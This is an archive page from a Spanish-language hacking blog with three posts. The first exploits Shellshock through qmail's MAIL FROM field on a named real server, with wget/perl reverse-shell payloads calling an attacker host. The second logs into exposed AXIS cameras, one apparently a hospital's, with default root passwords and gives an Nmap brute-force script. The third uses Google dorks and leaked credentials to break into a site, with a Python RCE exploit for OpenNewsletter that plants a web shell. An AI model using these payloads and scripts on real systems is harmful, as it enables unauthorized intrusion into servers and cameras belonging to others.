
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>Security Signal</title>
  <meta name="author" content="q3rv0 - hdbreaker">

  
  <meta name="description" content="by hdbreakerComo he leido mucho de shellshock y nada sobre como explotarlo, les dejo un pequeño tutorial de como explotarlo un poco más allá que en &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://securitysignal.github.io/posts/4/">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="Security Signal" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">Security Signal</a></h1>
  
    <h2>Looking for signs of insecurity...</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="sitesearch" value="securitysignal.github.io">
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div class="blog-index">
  
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/01/18/explotar-shellshock-en-qmail/">Explotar Shellshock en QMAIL</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-01-18T20:33:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>8:33 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><a href="http://o.aolcdn.com/hss/storage/midas/f49ea385f8ba194207b5ef4b685e6d24/200814072/shellshock-rob-graham-twitter.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://o.aolcdn.com/hss/storage/midas/f49ea385f8ba194207b5ef4b685e6d24/200814072/shellshock-rob-graham-twitter.jpg" height="358" width="640" /></a></div><div style="text-align: right;"><b>by hdbreaker</b><br /><div style="text-align: left;"><br /></div></div>Como he leido mucho de shellshock y nada sobre como explotarlo, les dejo un pequeño tutorial de como explotarlo un poco más allá que en los clasicos user-agent (que siendo realista muy pocos servidores utlizán cgi-scripts y menos hechos en bash)<br /><br />Lecturas recomendadas:<br /><a href="http://es.wikipedia.org/wiki/Shellshock_%28error_de_software%29">http://es.wikipedia.org/wiki/Shellshock_%28error_de_software%29 </a><br /><a href="http://technet.microsoft.com/es-es/library/aa996114%28v=exchg.65%29.aspx">http://technet.microsoft.com/es-es/library/aa996114(v=exchg.65).aspx</a><br /><br />Esto afecta a los servidores smtp de QMAIL por no validar correctamente el encabezado FROM MAIL:&lt;&gt; permitiendo ingresar como email cualquier string,<br />nosotros aprovecharemos esto para lograr ejecutar nuestro codigo arbitrario con la ayuda de shellshock<br /><br />Las precondiciones para realizar este ataque son las siguientes:<br /><br />1) Bash vulnerable a "Shellshock"<br />2) /bin/sh symlink apuntando a /bin/bash (esto es por que por defecto qmail es tratado por sh y no por bash)<br /><br />Para el PoC use este servidor que encontre vulnerable: 200.80.35.42<br /><br />Empezamos!<br /><br />1) Dejamos a la escucha el puerto donde queremos recibir la conexión entrante:<br /><br /><span style="color: red;">nc -vv -l -p 9669</span><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://oi57.tinypic.com/xpyczl.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://oi57.tinypic.com/xpyczl.jpg" height="452" width="640" /></a></div><div style="text-align: center;"><br /></div>2) Nos conectamos al servidor smtp y realizamos el ataque<br /><br /><span style="color: red;">nc -vv 200.80.35.42 25</span><br /><br />Entablamos toda la negociación necesaria con el servidor SMTP, esto consta de 4 pasos<br /><br /><pre class="brush: bash">.helo me (Le comunicamos al servidor que necesitamos usar su servicio)<br />.mail from:&lt;direccion@gmail.com&gt; (establecemos la dirección de email remitente) ---&gt; ACÁ INYECTAMOS NUESTRO CODIGO SHELLSHOCK<br />.rcpt to: &lt;&gt; (direccion@dominio.com) (establecemos la direccion del receptor del mensaje)<br />.data (Comenzamos a escribir el email)<br />.Subject: Titulo. (Establecemos el titulo del mensaje y lo terminamos con un .)<br />.Mensaje. (Escribimos el mensaje terminado con un .)<br /><br /></pre>FIN (Esperamos que se complete el proceso)  <br /><br />Bueno como mas arriba dije el error radica en que QMAIL no valida que lo ingresado en MAIL FROM sea un email por lo que podemos aprovechar este comando smtp para inyectar nuestro payload shellshock<br /><br />Payload:<br /><br /><pre class="brush: bash">() { :;}; /usr/bin/wget xxx.no-ip.org:8080/rsh.perl<br /><br /></pre>Al terminar el proceso de QMAIL debería ejecutar el codigo arbitrario inyectado en la variable y devolvernos una conexión entrante a nuestro puertoen escucha<a href="http://oi59.tinypic.com/33opfyd.jpg" style="margin-left: 1em; margin-right: 1em;"></a><br /><br /><div style="text-align: center;"><a href="http://oi59.tinypic.com/33opfyd.jpg" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://oi59.tinypic.com/33opfyd.jpg" height="250" width="640" /></a></div><br />Bien, hemos logrado ejecutar código con exito en el servidor mediante un error de validación de SMTP, en este simple PoC realice una simple conexión telnet, pero podríamos jugar un poco con los comandos para subir un reverse shell y ganar acceso al sistema, veamos como!  <br /><br />Esta vez vamos a ejecutar código arbitrario para descargarnos de nuestro servidor web un reverse shell en perl  <br /><br />Payload: <br /><br /><pre class="brush: bash">() { :;}; /usr/bin/wget xxx.no-ip.org:8080/rsh.perl<br /></pre><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://oi58.tinypic.com/4rw39v.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://oi58.tinypic.com/4rw39v.jpg" height="426" width="640" /></a></div><div style="text-align: center;"><br /></div>esperamos un tiempo considerable para asegurarnos la descarga de nuestro script, ponemos a escuchar nuevamente netcat.  <br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://oi57.tinypic.com/xpyczl.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://oi57.tinypic.com/xpyczl.jpg" height="452" width="640" /></a></div><div style="text-align: center;"><br /></div>luego de esto ejecutamos nuestro archivo perl mediante el siguiente Payload:<br /><br /><pre class="brush: bash">() { :;}; /usr/bin/perl rsh.perl xxx.no-ip.org 9669 -l<br /></pre><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://oi58.tinypic.com/140knjp.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://oi58.tinypic.com/140knjp.jpg" height="230" width="640" /></a></div><br />y ahora tenemos acceso al sistema!<br />si indagamos un poco y largamos un whoami! vemos que es un kernel 2.6  <br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://oi58.tinypic.com/k3rklf.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://oi58.tinypic.com/k3rklf.jpg" height="86" width="640" /></a></div><div style="text-align: center;"><br /></div>Intentemos rootearlo, yo en mi caso use un AutoRoot en perl que encontre por internet.  <span style="color: red;">wget xxx.no-ip.com:8081/AutoRoot.pl </span><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://oi57.tinypic.com/2wnbhw3.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://oi57.tinypic.com/2wnbhw3.jpg" height="436" width="640" /></a></div><br />Pasemos a ver si tenemos suerte!  Ejecutamos los AutoRoot.pl y vemos que sucede (yo en mi caso moví ambos archivos a otra carpeta) <span style="color: red;">perl AutoRoot.pl</span> y esperamos...  <br /><br />En este caso no hemos tenido suerte, lo que no descarta que buscando un poco podamos hacer un rooteo manual del servidor pero eso quedara para otra entrada!<br /><br />Lectura recomendada:<br /><a href="http://www.securitysignal.tk/2015/01/rooteando-sin-local-exploit.html">http://www.securitysignal.tk/2015/01/rooteando-sin-local-exploit.html</a><br /><br /><div style="text-align: center;"><a href="http://oi57.tinypic.com/11kzg9e.jpg" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://oi57.tinypic.com/11kzg9e.jpg" height="434" width="640" /></a></div><br />Luego de esto me pregunte, cuantos sitios vulnerables a shellshock QMAIL pueden existen, bueno yo me ayude un poco de mi amigo SHODAN  <br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://oi60.tinypic.com/sor6ed.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://oi60.tinypic.com/sor6ed.jpg" height="396" width="640" /></a></div><div style="text-align: center;"><br /></div><br /><br />35500 posibles target vulnerables!!! <br /><br /><div style="text-align: right;"><b>Happy Haking</b></div></div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/01/17/tomando-el-control-de-una-camara-axis-i/">Tomando El Control De Una Camara AXIS (I)</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-01-17T12:37:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>17</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>12:37 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><div style="text-align: center;"><a href="http://i.imgur.com/5EQZHzO.jpg?1" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/5EQZHzO.jpg?1" height="400" width="400" /></a></div>Hay veces en las que se me da por jugar con <b>Shodan</b>, realizando  busqueda de routers, camaras IP u otros dispositivos, esta vez me puse a  indagar las camaras <b>AXIS</b>&nbspque&nbspse&nbspencontraban&nbspen&nbspla&nbspred&nbsppublica.<br />Simplemente poniedon AXIS en el buscador podemos encontrar unas cuantas disponibles,  sin embargo la gran mayoria dispone de  autentificacion HTTP Digest  para acceder al panel (pero no todas) incluso muchas poseen passwords  como el clasico 123456.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/bdRF413.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/bdRF413.png" height="384" width="640" /></a></div><br /><br /><br />Entonces me puse a averiguar informacion de este tipo de camaras, que  bien son dispositivos con Linux arm* embebido y otra cosa interesante  es que el user por defecto es root, asi que comence a probar intentos de  logueo con:<br /><br /><ul><li>root:123456</li><li>root:root</li></ul><br />Siempre a travez de las direcciones  que me arrojaba shodan y me cruze con una gran cantidad de dispositivos  que realmente estaban configurados con esas credenciales y es mas  algunos ni siquiera tenian activado la autentificacion por http.<br /><br />Me tope con algunas como estas:<br /><br /><i>Lo que pareciera ser un hospital.</i><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/s0ANBji.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/s0ANBji.png" height="490" width="640" /></a></div><i>&nbsp;Un pequeño local de electrodomesticos en Arabia Saudita</i><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/WkKgbxj.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/WkKgbxj.png" height="518" width="640" /></a></div><br /><i>&nbsp;Una pancheria en Medellin Colombia.</i><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/GU7RYI3.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/GU7RYI3.png" height="416" width="640" /></a></div><br /><br /><br />Ahora que ya habia accedido al panel, queria ver la forma de tomar el control del mini OS GNU.<br /><br />Por empezar estos dispositivos cuentan con un servidor ftp  configurado con las mismas credenciales que el http, pero por defecto el  demonio telnet se encuentra desabilitado al inicio, pero esto no quita  que pueda ser activado a travez del servidor web utilizando un editor de  ficheros dentro de las opciones del sistema.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/bcVGCF0.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/bcVGCF0.png" height="440" width="640" /></a></div><br />Solo basta con editar el fichero <b>/etc/inittab</b> y descomentar la linea:<br /><br /><script class="brush: bash" type="syntaxhighlighter"><![CDATA[ #tnet:35:once:/usr/sbin/telnetd ]]></script> <br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/j8iNHpW.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/j8iNHpW.png" height="354" width="640" /></a></div><br />Salvar los cambios, y reiniciar el dispositivo.<br /><br />Esto podemos hacerlo mediante el panel.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/BwaG0JK.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/BwaG0JK.png" height="388" width="640" /></a></div><br /><br />O bien por ftp con el siguiente comando.<br /><br /><script class="brush: bash" type="syntaxhighlighter"><![CDATA[ quote site reboot ]]></script> <br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/7u4SzOM.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/7u4SzOM.png" /></a></div><br />Una vez iniciado el sistema seremos capaces de establecer una conexion por telnet como usuario root.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/lHSLaKI.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/lHSLaKI.png" height="408" width="640" /></a></div><br />No quedando satisfecho con la pobre cantidad de camaras que me  proveia shodan me dispuse a codear un <b>NSE script</b> para realizar sondeos  con nmap y ver que me encontraba.<br />La manera de identificar estos juguetitos es mirando el banner que  tira el ftp, una vez identificado, el script simplemente intenta  loguearse como root, utilizando contraseñas debiles y ademas comprueba  si el panel se encuentra protegido.<br /><br /><script class="brush: perl" type="syntaxhighlighter"><![CDATA[ description = [[ Script que se encarga de buscar camaras AXIS que contengan credenciales debiles o sin autentificacion HTTP digest. ]]  author = "[Q]3rV[0]" license = "Same as Nmap--See http://nmap.org/book/man-legal.html" categories = {"brute", "auth"}  --- --  -- @usage nmap --script=axis_search -vv -T4 -Pn -n xx.xx.xxx.x -p80,21 -- @output --PORT   STATE SERVICE --21/tcp open  ftp --80/tcp open  http  --Host script results: --| axis: --|   Host = xxx.x.xxx.3 --|   Version = AXIS M7010 Video Encoder 5.40.6.1 (2011) ready. --|_  Auth = root:root --  ---   local http = require "http" local ftp = require "ftp" local nmap = require "nmap" local stdnse = require "stdnse" local string = require "string" local table = require "table"  hostrule=function(host)     local http_port, ftp_port     http_port=nmap.get_port_state(host, {number=80, protocol="tcp"})     if not http_port and not (http_port.state=="open" or http_port.state=="open|filtered") then         return false     end     ftp_port=nmap.get_port_state(host, {number=21, protocol="tcp"})     if not ftp_port and not (ftp_port.state=="open" or ftp_port.state=="open|filtered") then         return false     end     return true end  local out={}  local dic={'root', 123456, 1234}  local function data_out(out, message_banner, auth, host)     table.insert(out, string.format("Host = %s", host.ip))     table.insert(out, string.format("Version = %s", message_banner))     table.insert(out, string.format("Auth = %s", auth))     return stdnse.format_output(true, out) end  local function http_auth(host)     local response=http.get(host, 80, '/view/viewer_index.shtml')     return response end   action=function(host)     local socket=nmap.new_socket()     socket:connect(host, 21)     local buffer=stdnse.make_buffer(socket, "\r?\n")     local code, message_banner=ftp.read_reply(buffer)     if string.match(message_banner, "AXIS") then         local response=http_auth(host)         if response.status==401 or response.status==404 or response.status==403 then             for n,pass in ipairs(dic) do                 socket:send("USER root\r\n")                 local code, message=ftp.read_reply(buffer)                 if code==331 then                     socket:send("PASS "..pass.."\r\n")                 end                 local code, message=ftp.read_reply(buffer)                 if message == "User logged in, proceed." then                     return data_out(out, message_banner, 'root:'..pass, host)                 end             end         else             return data_out(out, message_banner, 'HTTP Blank Auth :)', host)         end         return data_out(out, message_banner, 'Failed Auth :(', host)     end end  ]]></script> Para terminar dejo una salida del script realizando un sondeo de prueba a la red xx.xxx.xx.x/24<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/yNeg2Th.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/yNeg2Th.png" /></a></div></div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/01/16/del-spam-la-intrucion/">Del Spam a La Intrucion</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-01-16T09:55:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>16</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>9:55 am</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><a href="http://www.andibauer.at/wp-content/uploads/2014/10/antispam.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://www.andibauer.at/wp-content/uploads/2014/10/antispam.jpg" height="360" width="640" /></a></div><div style="text-align: right;"><br /><b>by [Q]3rv[0]</b></div><h2 style="text-align: center;"><b>Prologo</b></h2>Hacia rato que no le echaba una ojeada al spam de mi gmail y esta vez tenia el basurin lleno, es que muchas veces uno puede encontrarse&nbspenvuelto&nbspen&nbspalguna&nbspaventurita que te alegre el dia o no, en este caso mas que nada fue un poco de diversion. <br /><br />En fin, mientras leia los subject de los correos me pare en uno que decia: “Your account has ben blocked”. <br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/pZT4QvO.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/pZT4QvO.png" height="368" width="640" /></a></div><div style="text-align: center;"><br /></div>Era un mail “supuestamente” eviado desde blockchain, pero como no tenia idea que servicio estaba prestando al publico me fui directamente a la url del sitio.  <br /><br /><a href="https://blockchain.info/">https://blockchain.info/</a> <br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/2F6W0PB.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/2F6W0PB.png" height="256" width="640" /></a></div><div style="text-align: center;"><br /></div>La verdad es que nunca me habia logueado en la aplicacion (segun recuerdo), es mas no tengo una cuenta referenciada a este tipo de servicios en general. <br /><br />Al instante y era obvio deduje que se trataba de un caso de phishing, asi que sin dudarlo segui el enlace acortado por goo.gl para afirmar lo antes predicho.  <br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/9b6q9pg.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/9b6q9pg.png" height="260" width="640" /></a></div><div style="text-align: center;"><br /></div>Por desgracia el path del fake no se encontraba, asi que por curiosidad quize seguir por mi parte para cersiorarme de si habia sido movido a otra ruta o es mas, para ver si lograba captar otros tipos de fraudes montados en el mismo hosting, pero…<br /><br /><b>como hiba a saber eso?</b><br /><br /><div style="text-align: center;"><h2><b>Un poco de Google Hacking</b></h2></div>Lo primero que hice fue arrancar a jugar con goo*, buscando diversas extenciones de ficheros, hasta que di con algo interesante.  <br /><br /><span style="color: red;">site:klsicci.com.my ext:txt</span><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/3KBiyMd.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/3KBiyMd.png" height="416" width="640" /></a></div><div style="text-align: center;"><br /></div>Archivos de configuracion en texto plano!, lamentablemente al pedirlos no se encontraban mas en la ruta, pero si google los tenia, habria que negociar con el.<br /><br /><span style="color: red;">cache:http://klsicci.com.my/admintest1/config/klsiccic4.txt</span><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/CN3KSrM.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/CN3KSrM.png" height="486" width="640" /></a></div><div style="text-align: center;"><br /></div>Aunque las credenciales podian ser viejas o con suerte, quizas, seguian en uso, no perdia nada con probar.  Trate de establer una conexion por mysql pero me nego el acceso, lo mas probable es que solo admitia conexiones desde localhost o bien mediante una lista de ips habilitadas.  <br /><br />Ya que conocia el user a travez del path /home/klsiccic/ informacion que habia obtenido de los ficheros cacheados, intente loguearme por ftp mediante el password de la db (Me he encontrado con muchos hostings que usan pass global para diferentes servicios), pero esta vez el ftp me reboto.  <br /><br />Todavia faltaba mucho por analizar, asi que segui probando con goog*.  Queria un acceso rapido, entonces pense que podria estar cacheada la webshell del atacante, si es que realmente habia usado una para obtener acceso. <br /><br />Luego de persistir con un par de strings <br /><br /><span style="color: red;">site:klsicci.com.my &amp;&amp; inurl:shell</span><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/TSNZpb8.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/TSNZpb8.png" height="464" width="640" /></a></div><div style="text-align: center;"><br /></div>Di con el objetivo, pero nuevamente el 404.  Por un lado me incitaba a seguir buscando ya que tenia el title de la webshell que podria ser la herramienta del spammer. <br /><br />Hasta ahora no queria cersiorarme por completo hasta estar seguro de que fuera el autor del echo, tal vez la webshell podria pertenecer a otro intruder que nada tenia que ver con el scam.  <br /><br />Largue otra busqueda.  <br /><br /><span style="color: red;">site:klsicci.com.my &amp;&amp; intitle:"=[ 1n73ct10n privat shell ]="</span><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/hq8hxbf.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/hq8hxbf.png" height="530" width="640" /></a></div><div style="text-align: center;"><br /></div>Y esta vez tenia un lindo historial, pero todos apuntaban a la misma url fallida.  Aprovechando la lista obtenida, encuentro entre los path que se le pasaban como parametro a la ex shell, un dir de nombre /opennews.  <br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/6fRzOJr.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/6fRzOJr.png" height="280" width="640" /></a></div><div style="text-align: center;"><br /></div><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/7za4QMt.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/7za4QMt.png" height="394" width="640" /></a></div><div style="text-align: center;"><br /></div><br />Opennewsletter es una aplicacion open-source para administrar listas de mails.<b>&nbsp;</b><br /><div style="text-align: left;"><div style="text-align: center;"><h2><b>OpenBUGletter</b></h2></div></div>Ravisando en exploit-db encuentro un reporte de multiples vulnerabilidades para las versiones &lt;=2.*. <br />Una de ellas y por cierto la mas critica hablaba de un RCE en la plataforma.  <br /><br /><a href="http://www.exploit-db.com/exploits/2981/">http://www.exploit-db.com/exploits/2981/</a><br /><br />Para ser aprovechado requieria de acceso a la administracion, investigando un poco en el source de opennews el cual lo obtuve de la siguiente web.  <br /><br /><a href="http://www.sourcexref.com/xref/opennewsletter/nav.html">http://www.sourcexref.com/xref/opennewsletter/nav.html</a><br /><br />Veo que las credenciales del admin son tomadas desde config.php y el user, pass por defecto es <b>admin:admin</b><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/0hWTNj4.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/0hWTNj4.png" height="404" width="640" /></a></div><div style="text-align: center;"><br /></div>Por suerte el fichero no habia sido retocado y pude obtener acceso. <br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/6PRAemn.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/6PRAemn.png" height="302" width="640" /></a></div><div style="text-align: center;"><br /></div>Por razones que desconocia el exploit no lograba darme una shell en el sistema, asi que me puse a leer el codigo para ver donde se daba el bug, mirando en subscribers.php se puede ver como se abre el fichero data.dat y se ingresa el contenido de la variable <b>$_POST['email']</b> sin sanitizar.  <br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/lbJNGtc.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/lbJNGtc.png" height="640" width="474" /></a></div><div style="text-align: center;"><br /></div><br />En settings.php se permite renombrar el mismo a travez de la variable <b>$_POST['db_file']</b> que al igual que la anterior no posee ningun tipo de filtro seguro. <br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/CXxwXJ8.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/CXxwXJ8.png" height="276" width="640" /></a></div><div style="text-align: center;"><br /></div>Ahora que ya tenia una idea de como inyectar codigo, lo unico que quedaba era incrustar un payload en data.dat y este a su vez renombrarlo a *.php, mirando nuevamente el exploit me doy cuenta que para ingresar el codigo hace una peticion a <b>subscribe.php</b> (fichero que no existe en esta version de opennews (2.5.1)), ademas del pasaje de parametros por GET.  <br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/b36Mm54.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/b36Mm54.png" height="106" width="640" /></a></div><div style="text-align: center;"><br /></div>Asi que decidi codear el mio propio para realizar la explotacion.  <br /><br /><pre class="brush: py">#!/usr/bin/env python<br /># Description: Opennewsletter remote code execution exploit<br /># Version tested: 2.5.1<br /># Author: q3rv0<br /><br />import urllib2<br />import urllib<br />import re<br /><br />class opennews_exploit:<br /><br />    def __init__(self, host):<br />        self.host=host<br />        cookies=urllib2.HTTPCookieProcessor()<br />        opener=urllib2.build_opener(cookies)<br />        urllib2.install_opener(opener)<br /><br />    def postSend(self, parametros, path):<br />        self.headers={"User-Agent":"Mozilla/5.0 (X11; Linux i686; rv:24.0) Gecko/20140319 Firefox/24.0 Iceweasel/24.4.0"}<br />        self.parametros=urllib.urlencode(parametros)<br />        self.path=path<br />        self.post=urllib2.Request(self.host+self.path, self.parametros, headers=self.headers)<br />        return urllib2.urlopen(self.post)<br /><br />    def getOldDbFile(self):<br />        self.get=urllib2.urlopen(self.host+"settings.php").read()<br />        self.name=re.findall("name=old_db_file value=([\w\.\-_]+)&gt;", self.get)<br />        return self.name[0]<br /><br />    def verifyShell(self, path):<br />        try:<br />            self.path=path<br />            self.code=urllib2.urlopen(self.host+self.path)<br />            return self.code.getcode()<br />        except:<br />            pass<br /><br />target="http://pwnedhost.com/opennews/"<br />shell="shell.php"<br />user="admin"<br />passwd="admin"<br />admin_name="Your Name"<br />admin_email="you@domain.com"<br />charset="UTF-8"<br />site_url="http://www.yourwebsite.com"<br />opennews_directory="/"<br />payload=""<br /><br />rce=opennews_exploit(target)<br /><br />def get_shell(shell):<br />    print "[*] Obteniendo la shell :)\n"<br />    while True:<br />        command=raw_input("$~: ")<br />        print "\n"+rce.postSend({"exec":command}, shell).read()<br /><br />if rce.verifyShell(shell)==200:<br />    get_shell(shell)<br /><br />else:<br />    print "\n[*] Logueando...\n"<br />    rce.postSend({"username":user, "password":passwd}, "index.php?action=login")<br />    print "[*] Insertando el payload...\n"<br />    rce.postSend({"email":payload}, "subscribers.php?action=add")<br />    print "[*] Renombrando la shell...\n"<br />    rce.postSend({"admin_username":user, "admin_password":passwd, "admin_name":admin_name, "admin_email":admin_email, "charset":charset, "site_url":site_url, "opennewsletter_dir":opennews_directory, "old_db_file":rce.getOldDbFile(), "db_file":shell, "action":"update"}, "settings.php")<br />    get_shell(shell)<br /><br /></pre>(Cabe decir que el codigo del exploit es a modo de POC, solo fue testeado en la version 2.5.1, podria no funcionar en versiones anteriores.)<br /><br /><b>run exploit</b> <br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/45SiCdg.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/45SiCdg.png" height="176" width="640" /></a></div><div style="text-align: center;"><br /></div>Listo! ya estaba dentro.  <br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/2tssG3F.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/2tssG3F.png" height="320" width="640" /></a></div><div style="text-align: center;"><br /></div><h2 style="text-align: center;"> Buscando rastros del scam.</h2><br />Luego de darle vueltas durante un rato, entrar y salir de directorios, darle a find como loco, no pude dar con el phishing, muchas veces las aventuras nunca terminan como uno quiere, eso terminaba por confirmarme de que el admin se habia encargado de el. Pero por otra parte encontre ciertos ficheros que comprometian aun mas al spammer/intruder.  